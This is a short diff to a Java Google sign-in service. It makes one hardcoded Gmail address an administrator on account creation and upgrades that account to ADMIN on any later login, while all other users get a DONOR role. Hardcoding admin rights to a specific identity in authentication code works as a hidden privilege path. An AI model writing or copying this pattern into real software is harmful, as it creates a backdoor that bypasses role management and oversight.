@@ -142,12 +142,21 @@ public class GoogleAuthService {
             /*
              * Default role for new users
              */
-            user.setRole("DONOR");
+            if (email != null && email.equals("sayondeepdapira@gmail.com")) {
+                user.setRole("ADMIN");
+            } else {
+                user.setRole("DONOR");
+            }
 
             user.setEnabled(true);
 
-            user =
-                    userRepository.save(user);
+            user = userRepository.save(user);
+        } else {
+            // Upgrade existing user to ADMIN if their email matches
+            if (email != null && email.equals("sayondeepdapira@gmail.com") && !"ADMIN".equals(user.getRole())) {
+                user.setRole("ADMIN");
+                user = userRepository.save(user);
+            }
         }
 
         /*
